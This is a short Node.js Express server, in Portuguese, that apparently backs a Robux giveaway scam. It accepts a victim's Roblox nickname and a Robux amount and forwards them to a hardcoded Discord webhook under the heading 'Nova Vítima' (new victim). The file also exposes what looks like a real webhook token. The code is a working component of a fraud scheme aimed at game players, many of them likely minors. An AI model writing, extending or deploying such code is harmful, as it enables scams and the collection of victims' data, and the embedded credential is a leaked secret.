// server.js
const express = require('express');
const fetch = require('node-fetch');
const app = express();
app.use(express.json());

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395175802638700655/M1-TjcOt8_Gvxy6mKcMbOZrU12AbDyCJ3yX_zDCjctyR6JCQgyiXL0LXiAT1y_0-LA-c';

app.post('/api/enviar', async (req, res) => {
  const { nick, robux } = req.body;

  if (!nick || !robux) {
    return res.status(400).send("Dados inválidos");
  }

  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `Nova Vítima 👤\nNick: ${nick}\n💸 Quantidade de Robux: ${robux}`
      })
    });
    res.status(200).send("Enviado com sucesso");
  } catch (err) {
    console.error("Erro ao enviar:", err);
    res.status(500).send("Erro interno");
  }
});

app.listen(3000, () => {
  console.log("Servidor rodando na porta 3000");
});
